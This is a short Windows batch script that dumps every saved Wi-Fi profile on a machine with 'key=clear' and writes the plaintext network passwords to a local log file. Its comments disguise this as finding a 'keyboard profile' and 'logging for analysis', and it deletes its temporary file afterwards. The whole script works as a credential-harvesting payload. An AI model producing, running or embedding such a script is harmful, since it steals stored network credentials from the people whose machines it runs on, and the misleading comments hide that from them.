@echo off
REM Find keyboard profile, loop
netsh wlan show profile | findstr ":" > etc\tmp
for /F "tokens=*" %%A in (etc\tmp) do call :hloop %%A
goto End
:hloop
REM Logging for analysis
netsh wlan show profile %5 key=clear >> etc\log.txt
goto :eof
:End
del etc\tmp